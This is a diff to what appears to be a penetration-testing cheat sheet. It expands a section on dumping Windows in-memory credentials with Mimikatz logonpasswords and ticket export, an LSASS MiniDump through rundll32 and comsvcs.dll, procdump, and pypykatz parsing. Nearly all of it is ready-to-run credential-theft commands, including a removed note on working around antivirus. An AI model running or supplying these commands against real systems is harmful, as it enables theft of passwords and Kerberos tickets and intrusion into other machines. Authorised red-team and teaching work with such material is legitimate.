@@ -405,14 +405,17 @@ cat /proc/net/fib_trie | grep "LOCAL\|HOST" | awk '{print $2}' | sort -u
 **In-memory credentials (requires SYSTEM or SeDebugPrivilege):**
 ```powershell
 # Mimikatz — dump LSASS (run as SYSTEM or admin)
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "exit"
 
-# If AV blocks mimikatz, try:
-# - Dumping lsass.exe process directly:
+# Built-in MiniDump via comsvcs.dll (no 3rd-party binary):
+$lsassPid = (Get-Process lsass).Id
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
+
+# Or procdump:
 tasklist | findstr lsass
 procdump.exe -accepteula -ma <lsass_pid> C:\Temp\lsass.dmp
-# Transfer dump to Kali → impacket-secretsdump -sam sam.hive LOCAL
-# Or use pypykatz: pypykatz lsa minidump lsass.dmp
+
+# Parse dump on Kali → pypykatz lsa minidump lsass.dmp
 
 # WDigest — if enabled, plaintext passwords cached in memory
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
